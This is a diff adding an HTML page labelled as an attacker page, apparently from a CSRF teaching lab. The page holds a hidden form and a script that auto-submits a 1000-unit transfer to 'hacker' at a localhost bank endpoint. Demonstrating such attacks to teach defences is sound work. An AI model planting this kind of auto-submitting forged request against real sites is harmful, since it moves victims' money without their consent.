@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Attacker page (auto-submitting POST)</h2>
+    <form
+      id="attackForm"
+      method="POST"
+      action="http://localhost:3000/transfer"
+      style="display: none"
+    >
+      <input name="to" value="hacker" />
+      <input name="amount" value="1000" />
+    </form>
+    <script>
+      // Auto-submit after 1 second (simulate user visiting the page)
+      setTimeout(() => document.getElementById("attackForm").submit(), 1000);
+    </script>
+    <p>Form will auto-submit to the bank's transfer endpoint.</p>
+  </body>
+</html>
